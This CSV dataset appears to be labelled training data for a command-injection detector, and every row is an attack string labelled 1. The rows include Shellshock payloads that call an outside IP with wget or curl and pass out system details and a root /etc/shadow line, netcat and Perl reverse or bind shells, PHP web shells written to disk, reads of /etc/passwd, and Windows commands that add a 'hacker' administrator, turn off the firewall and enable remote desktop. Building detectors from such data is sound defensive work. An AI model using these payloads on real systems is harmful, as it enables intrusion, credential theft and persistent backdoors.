Sentence,Label
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`""",1
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`""",1
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`""",1
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=5""",1
"() { :;}; /bin/bash -c ""sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6""",1
"() { :;}; /bin/bash -c ""sleep 1 && echo vulnerable 1""",1
"() { :;}; /bin/bash -c ""sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7""",1
"() { :;}; /bin/bash -c ""sleep 3 && echo vulnerable 3""",1
"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8""",1
"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9""",1
"() { :;}; /bin/bash -c ""sleep 6 && echo vulnerable 6""",1
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`""",1
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`""",1
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`""",1
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`""",1
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`""",1
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`""",1
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=4""",1
cat /etc/hosts,1
$(`cat /etc/passwd`),1
cat /etc/passwd,1
%0Acat%20/etc/passwd,1
"{{ get_user_file(""/etc/passwd"") }}",1
"<!--#exec cmd=""/bin/cat /etc/passwd""-->",1
"<!--#exec cmd=""/bin/cat /etc/shadow""-->",1
"<!--#exec cmd=""/usr/bin/id;-->",1
system('cat /etc/passwd');,1
"<?php system(""cat /etc/passwd"");?>",1
`,1
||,1
|,1
;,1
',1
"'""",1
"""",1
"""'",1
&,1
&&,1
%0a,1
%0a%0d,1
%0Aid,1
%0a id %0a,1
%0Aid%0A,1
%0a ping -i 30 127.0.0.1 %0a,1
%0A/usr/bin/id,1
%0A/usr/bin/id%0A,1
"%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1",1
%20{${phpinfo()}},1
%20{${sleep(20)}},1
%20{${sleep(3)}},1
a|id|,1
a;id|,1
a;id;,1
a;id\n,1
() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12,1
| curl http://crowdshield.com/.testing/rce.txt,1
& curl http://crowdshield.com/.testing/rce.txt,1
; curl https://crowdshield.com/.testing/rce_vuln.txt,1
&& curl https://crowdshield.com/.testing/rce_vuln.txt,1
curl https://crowdshield.com/.testing/rce_vuln.txt,1
" curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",1
"curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",1
$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),1
dir,1
| dir,1
; dir,1
$(`dir`),1
& dir,1
&&dir,1
&& dir,1
| dir C:\,1
; dir C:\,1
& dir C:\,1
&& dir C:\,1
dir C:\,1
| dir C:\Documents and Settings\*,1
; dir C:\Documents and Settings\*,1
& dir C:\Documents and Settings\*,1
&& dir C:\Documents and Settings\*,1
dir C:\Documents and Settings\*,1
| dir C:\Users,1
; dir C:\Users,1
& dir C:\Users,1
&& dir C:\Users,1
dir C:\Users,1
;echo%20'<script>alert(1)</script>',1
echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX,1
"| echo ""<?php include($_GET['page'])| ?>"" > rfi.php",1
"; echo ""<?php include($_GET['page']); ?>"" > rfi.php",1
"& echo ""<?php include($_GET['page']); ?>"" > rfi.php",1
"&& echo ""<?php include($_GET['page']); ?>"" > rfi.php",1
"echo ""<?php include($_GET['page']); ?>"" > rfi.php",1
"| echo ""<?php system('dir $_GET['dir']')| ?>"" > dir.php",1
"; echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",1
"& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",1
"&& echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",1
"echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",1
"| echo ""<?php system($_GET['cmd'])| ?>"" > cmd.php",1
"; echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",1
"& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",1
"&& echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",1
"echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",1
;echo '<script>alert(1)</script>',1
echo '<script>alert(1)</script>'// XXXXXXXXXXX,1
echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX,1
"| echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",1
"; echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",1
"& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",1
"&& echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",1
"echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",1
() { :;}; echo vulnerable 10,1
eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),1
eval('ls'),1
eval('pwd'),1
eval('pwd');,1
eval('sleep 5'),1
eval('sleep 5');,1
eval('whoami'),1
eval('whoami');,1
exec('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),1
exec('ls'),1
exec('pwd'),1
exec('pwd');,1
exec('sleep 5'),1
exec('sleep 5');,1
exec('whoami'),1
exec('whoami');,1
";{$_GET[""cmd""]}",1
`id`,1
|id,1
| id,1
;id,1
;id|,1
;id;,1
& id,1
&&id,1
;id\n,1
ifconfig,1
| ifconfig,1
; ifconfig,1
& ifconfig,1
&& ifconfig,1
/index.html|id|,1
ipconfig,1
| ipconfig /all,1
; ipconfig /all,1
& ipconfig /all,1
&& ipconfig /all,1
ipconfig /all,1
ls,1
$(`ls`),1
| ls -l /,1
; ls -l /,1
& ls -l /,1
&& ls -l /,1
ls -l /,1
| ls -laR /etc,1
; ls -laR /etc,1
& ls -laR /etc,1
&& ls -laR /etc,1
| ls -laR /var/www,1
; ls -laR /var/www,1
& ls -laR /var/www,1
&& ls -laR /var/www,1
| ls -l /etc/,1
; ls -l /etc/,1
& ls -l /etc/,1
&& ls -l /etc/,1
ls -l /etc/,1
ls -lh /etc/,1
| ls -l /home/*,1
; ls -l /home/*,1
& ls -l /home/*,1
&& ls -l /home/*,1
ls -l /home/*,1
*; ls -lhtR /var/www/,1
| ls -l /tmp,1
; ls -l /tmp,1
& ls -l /tmp,1
&& ls -l /tmp,1
ls -l /tmp,1
| ls -l /var/www/*,1
; ls -l /var/www/*,1
& ls -l /var/www/*,1
&& ls -l /var/www/*,1
ls -l /var/www/*,1
\n,1
\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`,1
\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`,1
\n/bin/ls -al\n,1
| nc -lvvp 4444 -e /bin/sh|,1
; nc -lvvp 4444 -e /bin/sh;,1
& nc -lvvp 4444 -e /bin/sh&,1
&& nc -lvvp 4444 -e /bin/sh &,1
nc -lvvp 4444 -e /bin/sh,1
nc -lvvp 4445 -e /bin/sh &,1
nc -lvvp 4446 -e /bin/sh|,1
nc -lvvp 4447 -e /bin/sh;,1
nc -lvvp 4448 -e /bin/sh&,1
\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n,1
\necho INJECTX\nexit\n\033[2Asleep 5\n,1
\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n,1
| net localgroup Administrators hacker /ADD,1
; net localgroup Administrators hacker /ADD,1
& net localgroup Administrators hacker /ADD,1
&& net localgroup Administrators hacker /ADD,1
net localgroup Administrators hacker /ADD,1
| netsh firewall set opmode disable,1
; netsh firewall set opmode disable,1
& netsh firewall set opmode disable,1
&& netsh firewall set opmode disable,1
netsh firewall set opmode disable,1
netstat,1
;netstat -a;,1
| netstat -an,1
; netstat -an,1
& netstat -an,1
&& netstat -an,1
netstat -an,1
| net user hacker Password1 /ADD,1
; net user hacker Password1 /ADD,1
& net user hacker Password1 /ADD,1
&& net user hacker Password1 /ADD,1
net user hacker Password1 /ADD,1
| net view,1
; net view,1
& net view,1
&& net view,1
net view,1
\nid|,1
\nid;,1
\nid\n,1
\n/usr/bin/id\n,1
"perl -e 'print ""X""x1024'",1
"|| perl -e 'print ""X""x16096'",1
"| perl -e 'print ""X""x16096'",1
"; perl -e 'print ""X""x16096'",1
"& perl -e 'print ""X""x16096'",1
"&& perl -e 'print ""X""x16096'",1
"perl -e 'print ""X""x16384'",1
"; perl -e 'print ""X""x2048'",1
"& perl -e 'print ""X""x2048'",1
"&& perl -e 'print ""X""x2048'",1
"perl -e 'print ""X""x2048'",1
"|| perl -e 'print ""X""x4096'",1
"| perl -e 'print ""X""x4096'",1
"; perl -e 'print ""X""x4096'",1
"& perl -e 'print ""X""x4096'",1
"&& perl -e 'print ""X""x4096'",1
"perl -e 'print ""X""x4096'",1
"|| perl -e 'print ""X""x8096'",1
"| perl -e 'print ""X""x8096'",1
"; perl -e 'print ""X""x8096'",1
"&& perl -e 'print ""X""x8096'",1
"perl -e 'print ""X""x8192'",1
"perl -e 'print ""X""x81920'",1
|| phpinfo(),1
| phpinfo(),1
 {${phpinfo()}},1
;phpinfo(),1
;phpinfo();//,1
';phpinfo();//,1
{${phpinfo()}},1
& phpinfo(),1
&& phpinfo(),1
phpinfo(),1
phpinfo();,1
"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",1
"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj"");?>",1
"<?php system(""echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"");?>",1
"<?php system(""sleep 10"");?>",1
"<?php system(""sleep 5"");?>",1
"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",1
"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc"");?>",1
:phpversion();,1
`ping 127.0.0.1`,1
& ping -i 30 127.0.0.1 &,1
& ping -n 30 127.0.0.1 &,1
;${@print(md5(RCEVulnerable))};,1
"${@print(""RCEVulnerable"")}",1
${@print(system($_SERVER['HTTP_USER_AGENT']))},1
pwd,1
| pwd,1
; pwd,1
& pwd,1
&& pwd,1
\r,1
"| reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",1
"; reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",1
"& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",1
"&& reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",1
"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",1
\r\n,1
route,1
| sleep 1,1
; sleep 1,1
& sleep 1,1
&& sleep 1,1
sleep 1,1
|| sleep 10,1
| sleep 10,1
; sleep 10,1
{${sleep(10)}},1
& sleep 10,1
&& sleep 10,1
sleep 10,1
|| sleep 15,1
| sleep 15,1
; sleep 15,1
& sleep 15,1
&& sleep 15,1
 {${sleep(20)}},1
{${sleep(20)}},1
 {${sleep(3)}},1
{${sleep(3)}},1
| sleep 5,1
; sleep 5,1
& sleep 5,1
&& sleep 5,1
sleep 5,1
 {${sleep(hexdec(dechex(20)))}},1
{${sleep(hexdec(dechex(20)))}},1
sysinfo,1
| sysinfo,1
; sysinfo,1
& sysinfo,1
&& sysinfo,1
system('cat C:\boot.ini');,1
system('cat config.php');,1
|| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,1
| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,1
; system('curl https://crowdshield.com/.testing/rce_vuln.txt');,1
& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,1
&& system('curl https://crowdshield.com/.testing/rce_vuln.txt');,1
system('curl https://crowdshield.com/.testing/rce_vuln.txt'),1
system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf'),1
system('curl https://xerosecurity.com/.testing/rce_vuln.txt');,1
